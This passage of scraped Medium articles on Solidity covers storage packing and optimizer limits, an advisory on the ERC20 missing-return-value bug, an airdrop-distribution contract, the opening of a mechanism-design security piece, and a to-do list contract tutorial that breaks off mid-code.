0xbbbb0000000000000000  or  not(sub(exp(0x2, 0xc0), exp(0x2, 0x80)))    /* \"c-many-variables--packing.sol\":157:167  c = 0xcccc */  and  0xcccc00000000000000000000000000000000  or  sub(exp(0x2, 0xc0), 0x1)    /* \"c-many-variables--packing.sol\":175:185  d = 0xdddd */  and  0xdddd000000000000000000000000000000000000000000000000  or  swap1  sstoreA lot of bit-shuffling that I can\u2019t decipher, and I don\u2019t care. The key thing to notice is that there\u2019s only one sstore.Optimization success!Breaking The OptimizerIf only the optimizer could work so well all the time. Let\u2019s break it. The only change we make is that we use helper functions to set the store variables:pragma solidity ^0.4.11;contract C {    uint64 a;    uint64 b;    uint64 c;    uint64 d;    function C() {      setAB();      setCD();    }    function setAB() internal {      a = 0xaaaa;      b = 0xbbbb;    }    function setCD() internal {      c = 0xcccc;      d = 0xdddd;    }}Compile:$ solc --bin --asm --optimize c-many-variables--packing-helpers.solThe assembly output is too much. We\u2019ll ignore most of the detail and focus on the structure:// Constructor functiontag_2:  // ...  // call setAB() by jumping to tag_5  jumptag_4:  // ...  // call setCD() by jumping to tag_7  jump// function setAB()tag_5:  // Bit-shuffle and set a, b  // ...  sstoretag_9:  jump  // return to caller of setAB()// function setCD()tag_7:  // Bit-shuffle and set c, d  // ...  sstoretag_10:  jump  // return to caller of setCD()Now there are now two sstore instead of one. The Solidity compiler can optimize within a tag, but not across tags.Calling functions could cost you far more, not so much because function calls are expensive (they are only jump instructions), but because sstore optimization could fail.To solve this problem, the Solidity compiler needs to learn how to inline functions, essentially getting the same code as not calling functions:a = 0xaaaa;b = 0xbbbb;c = 0xcccc;d = 0xdddd;If we peruse the complete assembly output, we\u2019d see that the assembly code for the functions setAB() and setCD() is included twice, bloating the size of the code, costing you extra gas to deploy the contract. We'll talk about this later when learning about the contract lifecycle.Why The Optimizer BreaksThe optimizer doesn\u2019t optimize across tags. Consider \u201c1+1\u201d, it can be optimized to 0x2 if under the same tag:// Optimize OK!tag_0:  0x1  0x1  add  ...But not if the instructions are separated by tags:// Optimize Fail!tag_0:  0x1  0x1tag_1:  add  ...This behaviour is true as of Version 0.4.13. Could change in the future.Breaking The Optimizer, AgainLet\u2019s see another way the optimizer fails. Does packing work for a fixed length array? Consider:pragma solidity ^0.4.11;contract C {    uint64[4] numbers;    function C() {      numbers[0] = 0x0;      numbers[1] = 0x1111;      numbers[2] = 0x2222;      numbers[3] = 0x3333;    }}Again, there are four 64 bits numbers we\u2019d hope to pack into one 32 bytes storage slot, using exactly one sstore instruction.The compiled assembly is too long. Let\u2019s instead just count the number of sstore and sload instructions:$ solc --bin --asm --optimize c-static-array--packing.sol | grep -E '(sstore|sload)'  sload  sstore  sload  sstore  sload  sstore  sload  sstoreOh noes. Even though this fixed-length array has exactly the same storage layout as equivalent struct or store variables, optimization fails. It now takes four pairs of sload and sstore.A quick look at the assembly code reveals that each array access has bound checking code, and organized under different tags. But tag boundaries break optimization.There is a small consolation though. The 3 extra sstore instructions are cheaper than the first:sstore costs 20000 gas for first write to a new position.sstore costs 5000 gas for subsequent writes to an existing position.So this particular optimization fail costs us 35k instead of 20k, 75% extra.ConclusionIf the Solidity compiler can figure out the size of store variables, it simply lays them out one after another in storage. If possible, the compiler packs the data tightly in chunks of 32 bytes.To summarize the packing behaviour we\u2019ve seen so far:Store variables: yes.Struct fields: yes.Fixed-length arrays: no. In theory, yes.Because storage access costs so much, you should think of the store variables as your database schema. When writing contracts, it could be useful to do small experiments, and examine the assembly to find out if the compiler is optimizing properly.We can be sure that the Solidity compiler will improve in the future. For now, unfortunately, we can\u2019t trust its optimizer blindly.It pays, literally, to understand your store variables.", "responses": "8"}, {"title": "Missing return value bug\u200a\u2014\u200aAt least 130 tokens\u00a0affected", "author_name": "Lukas Cremer", "link": "https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca?source=search_post", "post_date": "Jun 5, 2018", "readtime": "6 min read", "upvotes": "1.1K", "content": "Missing return value bug\u200a\u2014\u200aAt least 130 tokens\u00a0affectedLukas CremerBlockedUnblockFollowFollowingJun 5, 2018tl;dr There is a critical bug in a lot of ERC20 token contracts that surfaced due to a recent Solidity update.ERC BasicsThe ERC20 standard is by far the most common token standard on the Ethereum platform. ERC20 is defined as an interface that specifies which functions and events have to be implemented in a smart contract to be ERC20 compliant. Currently, these are following:What should the transfer function of an ERC20 contract return?During the development of ERC20, there were lengthy discussions about the correct return values of the transfer function of an ERC20 contract. There were basically two camps in this discussion. One side argued that the transfer function should return false if the transfer failed to allow error handling in the calling contract. The other side claimed that an ERC20 should revert the transaction in case of failure to ensure safety. This matter was never really settled and both behaviors are now considered to be ERC20 compliant. The most common behavior is a revert in case of failure, especially since OpenZeppelin implemented their ERC20 token by this means.All this has little to do with the actual bug I want to describe, but may be helpful to provide some context.The BugIt turned out that a significant percentage of ERC20 token behave in yet another way regarding the return values of the transfer function.The transfer functions of these token contracts (let\u00b4s call them BadTokens) do not return anything. The interface they are complying to, looks like this:This interface is not complying to the ERC20 standard, which means that the contracts implementing this interface are not ERC20 tokens.One important point of having a token standard, is to enable other smart contracts to interact with many different token contracts through a common interface. There are many different contracts that use this feature of an ERC20 token. Decentralized exchanges can send tokens, crowdsale contracts can accept ERC20 token as payment and so on. Now the interesting question is, what happens if a contract that expects an ERC20 interface is trying to interact with a BadToken that is not ERC20 compliant?Let\u00b4s have a look at this scenario:In Solidity a function selector is derived from its function name and the type of the input parameters.selector = bytes4(sha3(\u201ctransfer()\u201d))The return value of a function is not part of a function selector. So a function transfer() without a return value and a function transfer() returns(bool) have the same function selector but they are still different. If you would trycontract BadToken is Token {                         function transfer() {}         }the compiler would not accept the transfer() function as an implementation of the Token interface, because of the missing return value. So the GoodToken is an implementation of the Token interface, the BadToken is not.What happens if we call it anyway?The calling contract sends an external call to the BadToken, which processes the call, makes the transfer and does not return a Boolean return value. The calling contract now looks up the return value in the memory, but since the token did not write a return value it will take whatever it finds in this memory position as the return value of the external call.This is already pretty bad: taking some data that happens to be in a memory slot as a return value is not a good idea.By sheer coincidence this problem didn\u2019t surface in the past because the memory slot in which the caller expected the return value, overlapped with the memory slot, the function selector of the call was stored in. This was interpreted by the EVM as the return value \u201ctrue\u201d. And so, by pure luck, the EVM behaved like the programmers intended it to behave.But this is not the case for newer smart contracts.What changed?Since the Byzantium hard fork last October, the EVM has a new opcode, called RETURNDATASIZE. This opcode stores (as the name implies) the size of the returned data of an external call. This is a very useful opcode, since it allows to return dynamically sized arrays in function calls.This opcode was adopted in the Solidity 0.4.22 update (when set to post-Byzantium mode, which is the default). Now, the code checks the size of the return value after an external call and reverts the transaction in case the return data is shorter than expected. This is a much safer behavior than reading data from some memory slot. But this new behavior is a huge problem for our BadTokens.Who is affected.To get an idea of how widespread this issue is, I took the list of ERC20 tokens listed on Etherdelta and checked their API verified on Etherscan. Thereby, I found 130 affected token contracts.There are some big names on this list:The biggest tokens (by Market Cap) on the list are:Binance Coin $1.587.146.847OmiseGO $1.127.641.627But there are a lot of small and mid-sized tokens on this list, too.What\u00b4s the risk?As described above, the biggest risk is that a smart contract that is compiled with solc \u2265 0.4.22\u00a0, which is expecting an ERC20 interface, will not be able to interact with our BadTokens. This could mean that tokens which are send to such a contract, will be stuck there forever even if the contract has a function to transfer ERC20 token. There are many different scenarios where contracts, handling ERC20 tokens would run into this bug. One example is, that you would not be able to use decentralized exchanges that compiled its contract with solc \u2265 0.4.22 with your BadToken.How could this happen?This issue is clearly a bug in the token contract. The change in Solidity only brought this bug to daylight. One reason why there are so many BadTokens is that at one point OpenZeppelin implemented the wrong interface in their framework. Between 17 March 2017 and 13 July 2017 the interface was wrong:https://github.com/OpenZeppelin/openzeppelin-solidity/blob/52120a8c428de5e34f157b7eaed16d38f3029e66/contracts/token/ERC20Basic.solSo, most of the BadTokens used the faulty OpenZeppelin implementation of the ERC20 interface.So now what?There are two ways to fix this bug and I think these need to be approached in parallel.On one hand, the teams of the affected token contracts need to fix their contracts. This could be done by redeploying the token contract or by updating the contract, if the token contract has some ability to update the contract programmed into it.Another possibility is wrapping the token contract with a contract that calls the bad transfer function and returns a good transfer function. There are different proposals for such wrappers. e.g.On the other hand, developers who are writing contracts that handle ERC20 tokens need to be aware of this bug, so they can anticipate the unexpected behavior of the BadTokens and handle them. This could be done by expecting the BadERC20 interface and checking the return data after the call to determine whether we called a GoodToken or a BadToken.ConclusionI think there is no reason to panic at the moment, because the updating cycle of decentralized exchanges and other big contracts is quite long. Nevertheless, this bug needs to be fixed as soon as possible.There is also a very informative article about this issue from Christian. https://medium.com/@chris_77367/explaining-unexpected-reverts-starting-with-solidity-0-4-22-3ada6e82308cYou can read the issue on github here: https://github.com/ethereum/solidity/issues/4116Thanks to Christian\u00a0, G\u00e9rard and Eva for helping with this articleAbout lukas-berlinI\u00b4m a solidity developer and auditor based in Berlin. I\u00b4m also the CTO of sicos.io and an organizer of the Solidity Berlin meetup. (www.solidity.berlin)", "responses": "3"}, {"title": "How I built a multi-token Airdrop Central to distribute ERC20\u00a0tokens", "author_name": "Pablo Ruiz", "link": "https://medium.freecodecamp.org/how-i-built-a-multi-token-airdrop-central-to-distribute-erc20-tokens-cb70b6218b5c?source=search_post", "post_date": "Dec 11, 2017", "readtime": "10 min read", "upvotes": "941", "content": "Image sourceHow I built a multi-token Airdrop Central to distribute ERC20\u00a0tokensPablo RuizBlockedUnblockFollowFollowingDec 11, 2017Every now and then, while browsing questions on Ethereum Stack Exchange\u200a\u2014\u200athe go-to site for questions related to Solidity development, and for me, the go-to place to contribute to the dev community\u200a\u2014\u200aI see the following question:\u201cHow to do an airdrop of my tokens.\u201dIn the context of a Token Sale campaign, an Airdrop refers to sending tokens to multiple accounts for free. This is a trend that has recently become popular to promote upcoming ICOs / Token Crowdsales.Some of these airdrops are done as a time and/or volume based campaign, where people are told that if they own some amount of tokens by some date, they will receive more tokens.Some other airdrops are even done in an unsolicited manner. Teams will just send tokens to random accounts from a list. If you were on that list and you happen to check your balance for that token, you will see them.There are also a few sites that allow users to subscribe to find out how to willingly participate in these airdrops. They will typically ask you to subscribe to some mailing list or give you referral links to participate in token sales.How Token Airdrops are Typically DoneThere are a few ways these token airdrops are handled by teams.Some of them do it manually. They just build a list on an spreadsheet, and then proceed to manually transfer the tokens to each account.Others build a very simple smart contract, which receives an array of addresses, and proceeds to transfer some amount of tokens to each of those address.Others also use a smart contract to allow people to proactively withdraw tokens they have been assigned beforehand.I haven\u2019t yet seen a solution that allows people to just sign up and then receive any tokens sent by multiple teams.The Token Airdrop\u00a0CentralIn this article, I\u2019m going to describe how I built a smart contract that works as a central for airdrops. Basically, people can subscribe to this airdrop central, and from then on, when a team performs an airdrop to the central, the subscribed users can withdraw their share of the airdrop for free.On the other hand, teams doing airdrops can just send the tokens to this central which will get evenly distributed to all users subscribed at that time.The Airdrop Central keeps 2% of those tokens as a fee for the service.Its important to notice that this Airdrop Central allows any teams to drop their tokens for the existing community to withdraw. The list of users is shared among all teams. So the more people each team reaches out to individually, the more people that will benefit from tokens airdropped by other teams.As a side note, it\u2019s worth mentioning that this solution is not completely decentralized, as it depends on an owner to review and approve submissions. This mechanism is in place to prevent potential security issues related to having to trust unknown 3rd party contracts (ERC20 tokens submitted by teams). I couldn\u2019t allow just anyone to submit any contract address, which could contain malicious code instead of the typical ERC20 token.The Airdrop Central has not been deployed on any network yet, as I\u2019d like to thoroughly test it first. In the meantime, you can check the code (and even submit any bugs or suggestions) on my Github Repository:If you are a user wanting to receive tokens, please add your address to this list. When I deploy the Airdrop Central to the mainnet, I\u2019ll add your account to it so you can receive tokens from the get-go. Once teams start doing airdrops to it, you will be able to withdraw tokens for free.If you are a team looking into an easy way to send tokens to promote your Token Sale, please follow the instructions below to start the verification process.Once I deploy the Airdrop Central to the mainnet, I\u2019ll accept/reject the submissions. Open an Issue on the Airdrop Central\u2019s Github Repository with the tag \u201cSubmission\u201d and the following title: [Token Symbol]\u200a\u2014\u200a[Token Name]\u200a\u2014\u200a[Token Address]\u200a\u2014\u200a[Token Owner Address]. The token should already be deployed on the mainnet so the smart contract can be reviewed. An admin will notify you when it gets approved by leaving you a message on the Github Issue you created.How it\u00a0WorksFor the end users: Users sign up to the Token Central. Then, when a team airdrops tokens, the users can check how many of them they were awarded (based on how many were sent and how many users were signed to the central at that time) and withdraw them. All they need to know to withdraw their share of the tokens is the address of the token contract.For the teams: Submissions first have to be approved. Given that the Airdrop Central contract interacts with unknown and potentially harmful 3rd party contracts, it has to be approved by the central\u2019s owner or designated admins before a token is accepted. The admins will basically have to check that the address submitted corresponds to an ERC20 compliant token contract and that it doesn\u2019t contain any malicious code.Once the team and token are approved, they can make as many airdrops as they want using the same account and token address. The owner of the central keeps 2% of the submitted tokens as a fee for using the service, and the rest are stored within the contract, available for the users to withdraw. Each airdrop has an expiration date. Tokens not withdrawn by users by that date can be retrieved by the team.Using the Airdrop Central\u00a0ContractFor end users:Sign up to the Airdrop Central by executing the signUpForAirdrops() function. This will subscribe you to future airdrops.Call getTokensAvailableToMe(address _tokenAddress) to check how many tokens you are entitled to for the given token, based on whether or not the corresponding airdrop expired and how many tokens you already withdrew.If you want to withdraw your tokens, call withdrawTokens(address _tokenAddress) which will check the tokens available with the same logic as above and transfer them.You should now be able to call balanceOf(address _owner) on the token contract to see the tokens added to your balance.For teams:Submit your token information as explained above.Once the submission is approved, you\u2019ll be able to do the airdrop. First, you need to give an allowance for the tokens to the Airdrop Central on your ERC20 token. You can do that by calling approve() on the token and passing the address of the Airdrop Central and the amount to allow. Don\u2019t do this until your submission has been approved. Furthermore, only call approve()\u200a\u2014\u200adon\u2019t call transfer() or you will lose your tokens.Once you have given the Airdrop Central an allowance on the tokens you own, you can initiate the airdrop by calling the function airdropTokens(address _tokenAddress, uint _totalTokensToDistribute, uint _expirationTime)\u00a0where:address _tokenAddress is the address of the token you submitted.uint _totalTokensToDistribute is the total tokens to distribute.uint _expirationTime is how long (in seconds) will the airdrop last.Optional step: You can execute returnTokensToAirdropper(address _tokenAddress) to get back the tokens that were not collected once the expiration date has been reached.Regarding token distribution:_totalTokensToDistribute is the total amount of tokens you want to distribute. The function will take care of adding the necessary decimals, obtained from the token contract. For example: If you want to airdrop 100 tokens, just enter 100, no matter how many decimals your token has.The tokens you send will be evenly distributed between all users currently registered. You can check how many registered users the central currently has by calling userSignupCount() in order to approximately figure out how many tokens you want to distribute to each.Users that sign up after the airdrop has been submitted won\u2019t receive tokens from that submission.Building the Airdrop\u00a0CentralThe complete, fully commented code can be found on my Github Repository.What follows is a detailed explanation of the most important parts of the code.Managing SubmissionsAs mentioned above, we need to put a few mechanisms in place to prevent just anyone from submitting any contract. Since the Airdrop Central contract interacts with 3rd party token contracts that could contain harmful code, we first need to review each submission to prevent problems.In order to do this we will receive submissions off-chain, review them manually, and then, if everything is ok, approve them.function approveSubmission(address _airdropper, address _tokenAddress) public onlyAdmin {        require(!airdropperBlacklist[_airdropper]);        require(!tokenBlacklist[_tokenAddress]);                tokenWhitelist[_tokenAddress] = true;    }At any point, if we detect a problem with either a submitted contract or an account submitting malicious contracts, we can revoke access to the associated tokens and put them in a blacklist to prevent new submissions. Doing this also causes tokens to be inaccessible for withdrawal.This could be controversial, as it allows the owner/admins to freeze the tokens within the contract at their will. But on the other hand, it\u2019s the only mechanism we have to fight malicious code that might have gone undetected when the token contract was first approved.function revokeSubmission(address _airdropper, address _tokenAddress) public onlyAdmin {        if(_tokenAddress != address(0)){            tokenWhitelist[_tokenAddress] = false;            tokenBlacklist[_tokenAddress] = true;        }                if(_airdropper != address(0)){            airdropperBlacklist[_airdropper] = true;        }            }If, for some reason, we blacklisted the wrong token/account or they were good citizens after all, the owner can remove them from the blacklist. This also re-enables the frozen tokens to be withdrawn.User Sign-up\u00a0ProcessOnce the Airdrop Central contract has been deployed, users can start signing up. There are two ways to sign users up:They can do it themselves by calling the following function:function signUpForAirdrops() public ifNotPaused{        require(signups[msg.sender].userAddress == address(0));        signups[msg.sender] = User(msg.sender,now);        userSignupCount++;                E_Signup(msg.sender,now);    }Or an admin can sign them up by calling signupUsersManually(). Notice that, as opposed to a \u201cregular\u201d airdrop, the teams can\u2019t manually add users as we want to avoid \u201cspamming\u201d and adding users without their consent.function signupUsersManually(address _user) public onlyAdmin {        require(signups[_user].userAddress == address(0));        signups[_user] = User(_user,now);        userSignupCount++;                E_Signup(msg.sender,now);    }Additionally, users can remove themselves from the Airdrop Central to stop receiving tokens. Doing so also prevents them from being able to withdraw pending tokens. As a matter of fact they will be lost to them, so they should think twice before doing so.Token AirdropOnce a team has had their tokens approved by the Airdrop Central admin, they can perform any amount of airdrops for that token.First, they need to give an allowance of the tokens they want to distribute to the Airdrop Central contract. In order to do that, they need to call the approve() function on the token, specifying how many tokens they want to allow the Airdrop Central to use.Once that\u2019s taken care of, they can perform the airdrop by calling the following function:function airdropTokens(address _tokenAddress, uint _totalTokensToDistribute, uint _expirationTime) public ifNotPaused {        require(tokenWhitelist[_tokenAddress]);        require(!airdropperBlacklist[msg.sender]);                ERC20Basic token = ERC20Basic(_tokenAddress);        require(token.balanceOf(msg.sender) >= _totalTokensToDistribute);                //Multiply number entered by token decimals.        _totalTokensToDistribute = _totalTokensToDistribute.mul(10 ** uint256(token.decimals()));                // Calculate owner's tokens and tokens to airdrop        uint tokensForOwner = _totalTokensToDistribute.mul(ownersCut).div(100);        _totalTokensToDistribute = _totalTokensToDistribute.sub(tokensForOwner);                // Store the airdrop unique id in array (token address + id)        TokenAirdropID memory taid = TokenAirdropID(_tokenAddress,airdroppedTokens[_tokenAddress].length);        TokenAirdrop memory ta = TokenAirdrop(_tokenAddress,airdroppedTokens[_tokenAddress].length,msg.sender,now,now+_expirationTime,_totalTokensToDistribute,_totalTokensToDistribute,userSignupCount);        airdroppedTokens[_tokenAddress].push(ta);        airdrops.push(taid);                // Transfer the tokens        require(token.transferFrom(msg.sender,this,_totalTokensToDistribute));        require(token.transferFrom(msg.sender,owner,tokensForOwner));                E_AirdropSubmitted(_tokenAddress,ta.tokenOwner,ta.totalDropped,ta.airdropDate,ta.airdropExpirationDate);}The airdropTokens() function stores the tokens the contract was allowed to use in its internal balance. 2% of them are transferred to the contract owner and the rest are transferred to the contract. It can then distribute it among the users that were subscribed up to that moment.The team that performed the airdrop can also recover the tokens that remain unclaimed past the expiration date of each airdrop by calling this function:function returnTokensToAirdropper(address _tokenAddress) public ifNotPaused {        require(tokenWhitelist[_tokenAddress]); // Token must be whitelisted first                // Get the token        ERC20Basic token = ERC20Basic(_tokenAddress);                 uint tokensToReturn = 0;                for (uint i =0; i<airdroppedTokens[_tokenAddress].length; i++){            TokenAirdrop storage ta = airdroppedTokens[_tokenAddress][i];            if(msg.sender == ta.tokenOwner &&                airdropHasExpired(_tokenAddress,i)){                                tokensToReturn = tokensToReturn.add(ta.tokenBalance);                ta.tokenBalance = 0;            }        }        require(token.transfer(msg.sender,tokensToReturn));        E_TokensWithdrawn(_tokenAddress,msg.sender,tokensToReturn,now);}Token WithdrawalThe final thing we need to go over is the process by which the users withdraw the tokens they were sent. In order to do that, they need to call the withdrawTokens(address _tokenAddress) function. The function will go over all active (not yet expired or frozen) airdrops of the specified token and transfer them.function withdrawTokens(address _tokenAddress) ifNotPaused public {        require(tokenWhitelist[_tokenAddress]); // Token must be whitelisted first                // Get User instance, given the sender account        User storage user = signups[msg.sender];        require(user.userAddress != address(0));                uint totalTokensToTransfer = 0;        // For each airdrop made for this token (token owner may have done several airdrops at any given point)        for (uint i =0; i<airdroppedTokens[_tokenAddress].length; i++){            TokenAirdrop storage ta = airdroppedTokens[_tokenAddress][i];                        uint _withdrawnBalance = user.withdrawnBalances[_tokenAddress][i];                        //Check that user signed up before the airdrop was done. If so, he is entitled to the tokens            //And the airdrop must not have expired            if(ta.airdropDate >= user.signupDate &&                now <= ta.airdropExpirationDate){                                // The user will get a portion of the total tokens airdroped,                // divided by the users at the moment the airdrop was created                uint tokensToTransfer = ta.totalDropped.div(ta.usersAtDate);                                // if the user has not alreay withdrawn the tokens                if(_withdrawnBalance < tokensToTransfer){                    // Register the tokens withdrawn by the user and total tokens withdrawn                    user.withdrawnBalances[_tokenAddress][i] = tokensToTransfer;                    ta.tokenBalance = ta.tokenBalance.sub(tokensToTransfer);                    totalTokensToTransfer = totalTokensToTransfer.add(tokensToTransfer);                                    }            }        }        // Get the token        ERC20Basic token = ERC20Basic(_tokenAddress);         // Transfer tokens from all airdrops that correspond to this user        require(token.transfer(msg.sender,totalTokensToTransfer));                E_TokensWithdrawn(_tokenAddress,msg.sender,totalTokensToTransfer,now);    }Next StepsOne of the many things I\u2019d like to do next is to build a web interface (a dapp) that allows people to see the latest and upcoming airdrops and subscribe to them.If you are part of a team with an active ERC20 token, or you are planning on launching one and you\u2019d like to use the Airdrop Central to do an airdrop, drop me a line. Otherwise, any feedback and suggestions are greatly appreciated.I hope you enjoyed reading this article as much as I enjoyed writing it. I\u2019m currently taking consultancy jobs related to smart contracts development. If you are planning on raising funds through an ICO or building a Blockchain-based product, feel free to get in touch with me.", "responses": "14"}, {"title": "Mechanism Design Security in Smart Contracts", "author_name": "Matthew Di Ferrante", "link": "https://medium.com/@matthewdif/mechanism-design-security-in-smart-contracts-87f08555b38b?source=search_post", "post_date": "Jan 28, 2018", "readtime": "6 min read", "upvotes": "820", "content": "Mechanism Design Security in Smart ContractsMatthew Di FerranteBlockedUnblockFollowFollowingJan 28, 2018Inspired by 2-part series 6 Solidity Vulnerabilities and How to Stop Them, I thought I\u2019d write a bit about some of the more nuanced vulnerabilities that are related to mechanism design. In simple words, we will go over the vulnerabilities that arise from how smart contracts can interact with each other beyond what the author intended with the initial code.For now, I\u2019ll cover 2 main categories: Frontrunning and Malicious Smart Contract Wrapping. In a future article, I will go expand on some more complex game theory based flaws. Let\u2019s begin!", "responses": "9"}, {"title": "Smart Contract project: To Do Notes and My New\u00a0Book", "author_name": "Merunas Grincalaitis", "link": "https://medium.com/@merunasgrincalaitis/smart-contract-project-to-do-notes-and-my-new-book-8d569d4186a7?source=search_post", "post_date": "Apr 5, 2018", "readtime": "14 min read", "upvotes": "336", "content": "Smart Contract project: To Do Notes and My New\u00a0BookMerunas GrincalaitisBlockedUnblockFollowFollowingApr 5, 2018This is a fragment of my recently released book called \u201cEthereum Developer: Learn Solidity From Scratch\u201d. It\u2019s a book that I wrote from my experience working in about 5 different startups where I learned different things about creating Smart Contracts, decentralized applications and audits.You can find the book here on amazon free with kindle unlimited: https://www.amazon.com/dp/B07BJB1YNQ it covers everything you need to know from scratch including web3.js, dapps, audits and much more. Be sure to check the index to see if it could help you.In this article I\u2019ll give you for free a chapter of the book to show you what you\u2019ll find in it so that you see if you are interested in the book or not.Chapter 13 of the book, Smart Contract project: To Do\u00a0notesLet\u2019s put your new gained knowledge to practice with a cool project that you\u2019ll love.This is how the application will look like once the Smart Contracts, front end and web3.js integration is\u00a0completeAll projects should start with a clear specification of what we want to achieve because otherwise you\u2019ll waste time adding unnecessary features and making things differently from the initial goal.When you\u2019re working with a client, make sure you\u2019re understanding what they want to create with as much detail as possible. When working with ICOs, read carefully the whitepaper.This project is no different. Here\u2019s the specification that you\u2019ll be following to create this simple Smart Contract project:\u201cWe want to create a decentralized To Do application that allows users to store simple notes of no more than 32 letters. Each note must contain the date it was created, the address of the owner and if it\u2019s already completed or not. Any user will be able to create notes but only the owner of each note will be able to mark them as completed.\u201dLet\u2019s analyze for a second the specification to understand what we must do:The notes are limited to 32 letters. This means that we\u2019ll use bytes32 for the content of the note since it\u2019s the most optimized way to store them.The notes must contain the date they were created. We\u2019ll use the global variable now to get the current time.The notes have to contain the address of the owner that created that note. We\u2019ll use msg.sender to get the address of that user and store it in mapping.A function to mark the notes as completed. This means that we\u2019ll have to create a struct Notes with the information required and we\u2019ll create a function to update the state of each note.Only the owner will be able to modify the notes. We\u2019ll do this with a new type of function called modifier that allows us to make checks before doing any type of calculation. We\u2019ll use it to compare the address of the sender to the address of the owner of the note.Let\u2019s start by creating a folder in the desktop called todo-dapp and then a file called TodoList.sol. This will be the contract with all the logic. In the real world you usually create a Web3.js web app to interact with the contract. We\u2019ll do that later in this book so make sure you get this part working properly.Inside TodoList.sol, create the base Smart Contract layout:pragma solidity 0.4.20;contract TodoList {}Now you may be asking yourself. Where do I start with this application? Well, the main component of this contract is the Note element. Which is just a struct with several variables. Let\u2019s create that:pragma solidity 0.4.20;contract TodoList {   struct Todo {      bytes32 content;      address owner;      bool isCompleted;      uint256 timestamp;   }}Timestamp is the date that the note was created. The other fields are based on the specification.We now need a way to store those notes. We could use an array or a mapping. In this case we\u2019ll use both because each person, each address will have several notes and that can be accomplished with an array. We use a mapping because it allows us to get all the notes from a user with just his address without looping.pragma solidity 0.4.20;contract TodoList {   struct Todo {      uint256 id;      bytes32 content;      address owner;      bool isCompleted;      uint256 timestamp;   }   uint256 public constant maxAmountOfTodos = 100;      // Owner => todos   mapping(address => Todo[maxAmountOfTodos]) public todos;      // Owner => last todo id   mapping(address => uint256) public lastIds;}Note that you can make comments with a double forward slash // for line comments or with a slash with asterisk /**/ for block comments.Here\u2019s what I just did:I\u2019ve defined a variable called maxAmountOfTodos which is used to limit the amount of to-do notes each user can have. This is required to avoid that the number of notes that a user creates grows endlessly since we have gas limitations.The mapping todos is where the notes will be stored for each user address.The mapping of lastIds is just a way to keep track of the last ID used for each user, required to add new notes since we are using a fixed-size array in the todos mapping.I like to add a comment on top of each mapping to indicate exactly what the variables inside the mapping mean for clarity purposes. It\u2019s very important to document your code with lots of comments. It will help you understand and debug your code faster.Keep in mind that this is not the best possible solution for this specification. It\u2019s just my way of doing things. You could read the specification and store the notes in a single array in an efficient way. Don\u2019t take my word. Try it yourself without copying the code and see what you can do by yourself.At this point we can start creating the functions for this application. We\u2019ll need a way to add notes to the mapping of todos. Here\u2019s how I did it:pragma solidity 0.4.20;contract TodoList {   struct Todo {      uint256 id;      bytes32 content;      address owner;      bool isCompleted;      uint256 timestamp;   }   uint256 public constant maxAmountOfTodos = 100;      // Owner => todos   mapping(address => Todo[maxAmountOfTodos]) public todos;   // Owner => last todo id   mapping(address => uint256) public lastIds;      modifier onlyOwner(address _owner) {      require(msg.sender == _owner);      _;   }   // Add a todo to the list   function addTodo(bytes32 _content) public {      Todo memory myNote = Todo(lastIds[msg.sender], _content, msg.sender, false, now);      todos[msg.sender][lastIds[msg.sender]] = myNote;      if(lastIds[msg.sender] >= maxAmountOfTodos) lastIds[msg.sender] = 0;      else lastIds[msg.sender]++;   }}That\u2019s some new stuff over there. Don\u2019t be scared. Here\u2019s what I did:I\u2019ve created a modifier called onlyOwner to limit the access of the next function. Because we only want to allow the owner of each note to be able to modify his own notes. You\u2019ll later see where it\u2019s used.Then I created the function addTodo with the parameter _content which is the content of the note to create. Inside this function, I\u2019m creating a memory note called myNote and then I\u2019m adding that note to the array of notes of that user, in the mapping todos.Finally, I\u2019m updating the lastId of that user from the lastIds mapping to be able to add new notes since you need to know the index of each element inside the fixed-size array of todos.The parameters of the functions in Solidity usually have an underscore _ in front of them. This is to avoid problems with variables using the same name. For instance:bytes32 content;function addTodo(bytes32 content) {}Notice that those 2 content variables use the same name. This won\u2019t work because in Solidity you can\u2019t use already existing names inside the function. So, we always add an underscore in the function parameters to avoid this problem.Take a look at the struct instance myNote. Do you see something unusual? If you said \u201cThe keyword memory is new, I don\u2019t know what\u2019s that, please explain\u201d you are correct. Memory is a special word that you can use before the variable name when you declare the variable.It indicates that you don\u2019t want to store that variable on the blockchain. It keeps the variable in the memory of the user\u2019s computer executing that code and it\u2019s deleted after the function execution. We must do this on the struct instance Todo because without the memory keyword, Solidity tries to declare variables in storage.This means that when you create a new struct instance, Solidity tries to store it in the storage which is permanently writing information on the blockchain. The Ethereum Virtual Machine has three areas where it can store items.The first is \u201cstorage\u201d, where all the contract state variables reside. Every contract has its own storage and it is persistent between function calls and quite expensive to use.The second is \u201cmemory\u201d, this is used to hold temporary values. It is erased between (external) function calls and is cheaper to use.The third one is the stack, which is used to hold small local variables. It is almost free to use, but can only hold a limited amount of values.For almost all types, you cannot specify where they should be stored, because they are copied every time they are used.The types where the so-called storage location is important are structs and arrays. If you e.g. pass such variables in function calls, their data is not copied if it can stay in memory or stay in storage. This means that you can modify their content in the called function and these modifications will still be visible in the caller.In summary: you have to add the keyword \u201cmemory\u201d to temporary structs and arrays inside functions for avoiding problems with the blockchain storage.I highly recommend you to use the Remix IDE for developing Smart Contracts. It\u2019s a web app where you can write contracts and see errors immediately. You can access it on Remix.ethereum.org. Then, search for \u201cRemix Ethereum tutorial\u201d on youtube to understand how it works. Later in this book you\u2019ll see how it\u2019s used to deploy Smart Contracts on the Ropsten and main Ethereum blockchain networks.All the Smart Contract code that I write ends up in that IDE because it helps me spot errors quickly. It also allows you to execute the functions of your Smart Contract in the real Ethereum blockchain. You\u2019ll need Metamask which is an extension for browsers that allow you to connect to the blockchain.Before continuing with this I want you to do these 2 tasks:Learn how to use the Remix code editor by looking at videos on youtube. You can use it for free at http://Remix.ethereum.orgInstall Metamask and learn how to use it by searching videos. You can install it by going to Metamask.io.Those tools are a must to any Ethereum developer.After that we can continue with the project on the Remix IDE. The next step is to mark to-dos as completed. We\u2019ll do that with a function:pragma solidity 0.4.20;contract TodoList {   struct Todo {      uint256 id;      bytes32 content;      address owner;      bool isCompleted;      uint256 timestamp;   }   uint256 public constant maxAmountOfTodos = 100;      // Owner => todos   mapping(address => Todo[maxAmountOfTodos]) public todos;   // Owner => last todo id   mapping(address => uint256) public lastIds;   // Add a todo to the list   function addTodo(bytes32 _content) public {      Todo memory myNote = Todo(lastIds[msg.sender], _content, msg.sender, false, now);      todos[msg.sender][lastIds[msg.sender]] = myNote;         